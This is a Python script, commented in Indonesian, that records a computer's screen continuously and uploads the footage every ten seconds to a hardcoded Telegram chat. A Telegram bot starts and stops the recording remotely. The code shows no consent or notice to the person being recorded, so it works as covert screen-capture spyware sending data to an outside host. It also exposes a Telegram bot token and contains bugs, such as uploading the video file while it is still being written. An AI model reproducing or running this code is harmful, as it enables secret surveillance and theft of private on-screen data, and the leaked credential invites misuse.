import cv2
import pyautogui
import numpy as np
import telepot
import time
import threading
from telegram.ext import Updater, CommandHandler

# Variabel global untuk menyimpan thread dan menghentikan rekaman
record_thread = None
send_thread = None
stop_thread = False

# Fungsi untuk merekam layar
def record_screen():
    global stop_thread

    # Konfigurasi codec dan output video
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    out = cv2.VideoWriter('screen_record.avi', fourcc, 10.0, (1920, 1080))
    
    while not stop_thread:
        # Merekam layar
        screen = pyautogui.screenshot()
        frame = np.array(screen)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        # Menulis frame ke video
        out.write(frame)

        # Memberi jeda 0.1 detik antara setiap rekaman
        time.sleep(0.1)

    # Menutup file video setelah selesai merekam
    out.release()

def send_video():
    global stop_thread

    while not stop_thread:
        # Menunggu hingga video selesai direkam dan diproses
        time.sleep(10)

        # Token bot Telegram
        token = '7162129626:AAHPjAHve7J9plgEVnIJ-TqiahHRpig0Wnw'
        bot = telepot.Bot(token)

        # Mengirim video ke Telegram
        bot.sendVideo(chat_id='1853354706', video=open('screen_record.avi', 'rb'))

def start_monitoring(update, context):
    global record_thread, send_thread, stop_thread

    # Periksa apakah proses monitoring sudah berjalan
    if record_thread and record_thread.is_alive():
        update.message.reply_text('Monitoring telah berjalan sebelumnya.')
        return

    # Reset stop_thread ke False agar dapat memulai kembali rekaman
    stop_thread = False

    # Mulai merekam layar dalam thread terpisah
    record_thread = threading.Thread(target=record_screen)
    record_thread.start()

    # Mulai mengirim video ke Telegram dalam thread terpisah
    send_thread = threading.Thread(target=send_video)
    send_thread.start()

    update.message.reply_text('started, To Stop use /done')

def stop_monitoring(update, context):
    global stop_thread

    # Set stop_thread ke True untuk memberhentikan kedua thread
    stop_thread = True

    # Kirim pesan konfirmasi bahwa proses telah dihentikan
    update.message.reply_text('Done')

def main():
    # Inisialisasi updater
    updater = Updater('7162129626:AAHPjAHve7J9plgEVnIJ-TqiahHRpig0Wnw', use_context=True)

    # Tambahkan handler untuk perintah start dan stop
    updater.dispatcher.add_handler(CommandHandler('play', start_monitoring))
    updater.dispatcher.add_handler(CommandHandler('done', stop_monitoring))

    # Mulai bot
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
